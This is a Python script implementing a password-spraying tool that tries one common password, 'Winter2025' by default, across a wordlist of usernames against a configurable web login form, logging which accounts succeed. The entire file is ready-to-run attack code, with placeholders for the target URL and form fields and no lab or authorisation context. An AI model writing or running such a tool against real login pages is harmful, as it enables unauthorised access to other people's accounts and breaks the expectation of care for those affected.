import requests
from time import sleep
from urllib.parse import urljoin

class PasswordSprayer:
    """
    A robust password spraying tool for web login forms.
    Supports POST/GET, custom success detection, and rate limiting.
    """

    def __init__(
        self,
        target_url,          # CHANGE THIS: Target login URL
        username_field,      # CHANGE THIS: HTML 'name' attribute for username field
        password_field,      # CHANGE THIS: HTML 'name' attribute for password field
        method="POST",       # HTTP method (POST/GET)
        login_button=None,   # Optional: HTML 'name' attribute for login button
        success_indicators=None,  # List of strings/HTTP status codes indicating success
        failure_indicators=None,  # List of strings/HTTP status codes indicating failure
    ):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.method = method.upper()
        self.login_button = login_button
        self.success_indicators = success_indicators or [200, "Welcome", "Dashboard"]
        self.failure_indicators = failure_indicators or [401, "Invalid", "Login failed"]
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0"})

    def is_success(self, response):
        """Check if login was successful based on response."""
        if any(str(indicator) in str(response.status_code) for indicator in self.success_indicators):
            return True
        if any(indicator in response.text for indicator in self.success_indicators if isinstance(indicator, str)):
            return True
        return False

    def spray(
        self,
        password,            # CHANGE THIS: Password to test
        usernames,           # CHANGE THIS: List of usernames (from wordlist)
        delay=2,             # Delay between attempts (seconds)
        timeout=10,          # Request timeout (seconds)
        output_file="results.txt",  # Output file for results
    ):
        """
        Perform password spraying attack.
        Returns list of (username, password, status) tuples.
        """
        results = []
        with open(output_file, "w") as f:
            f.write("Username,Password,Status\n")
            for username in usernames:
                username = username.strip()
                data = {
                    self.username_field: username,
                    self.password_field: password,
                }
                if self.login_button:
                    data[self.login_button] = "submit"

                try:
                    if self.method == "POST":
                        response = self.session.post(self.target_url, data=data, timeout=timeout, allow_redirects=True)
                    else:
                        response = self.session.get(self.target_url, params=data, timeout=timeout, allow_redirects=True)

                    if self.is_success(response):
                        status = "SUCCESS"
                        print(f"[+] Success: {username}:{password}")
                    else:
                        status = "FAILED"
                        print(f"[-] Failed: {username}:{password}")

                    results.append((username, password, status))
                    f.write(f"{username},{password},{status}\n")

                except requests.exceptions.RequestException as e:
                    status = f"ERROR: {str(e)}"
                    print(f"[!] Error for {username}: {str(e)}")
                    results.append((username, password, status))
                    f.write(f"{username},{password},{status}\n")

                sleep(delay)  # Respectful delay

        return results

if __name__ == "__main__":
    # ===== USER CONFIGURATION =====
    # CHANGE THESE VALUES TO MATCH YOUR TARGET
    TARGET_URL = "https://example.com/login"  # Target login URL
    USERNAME_FIELD = "username"               # Username field name
    PASSWORD_FIELD = "password"               # Password field name
    METHOD = "POST"                           # HTTP method (POST/GET)
    LOGIN_BUTTON = "submit"                  # Login button name (if any)
    SUCCESS_INDICATORS = [200, "Welcome", "Dashboard"]  # Strings/HTTP codes for success
    FAILURE_INDICATORS = [401, "Invalid", "Login failed"]  # Strings/HTTP codes for failure
    PASSWORD = "Winter2025"                  # Password to test
    USERNAME_WORDLIST = "usernames.txt"      # Path to username wordlist
    DELAY = 2                                # Delay between attempts (seconds)
    OUTPUT_FILE = "spray_results.txt"        # Output file for results
    # ===== END CONFIGURATION =====

    # Load usernames
    with open(USERNAME_WORDLIST, "r") as f:
        usernames = f.readlines()

    # Initialize and run sprayer
    sprayer = PasswordSprayer(
        target_url=TARGET_URL,
        username_field=USERNAME_FIELD,
        password_field=PASSWORD_FIELD,
        method=METHOD,
        login_button=LOGIN_BUTTON,
        success_indicators=SUCCESS_INDICATORS,
        failure_indicators=FAILURE_INDICATORS,
    )
    results = sprayer.spray(PASSWORD, usernames, delay=DELAY, output_file=OUTPUT_FILE)

    # Print summary
    print("\n[Summary]")
    for result in results:
        print(f"{result[0]}:{result[1]} -> {result[2]}")
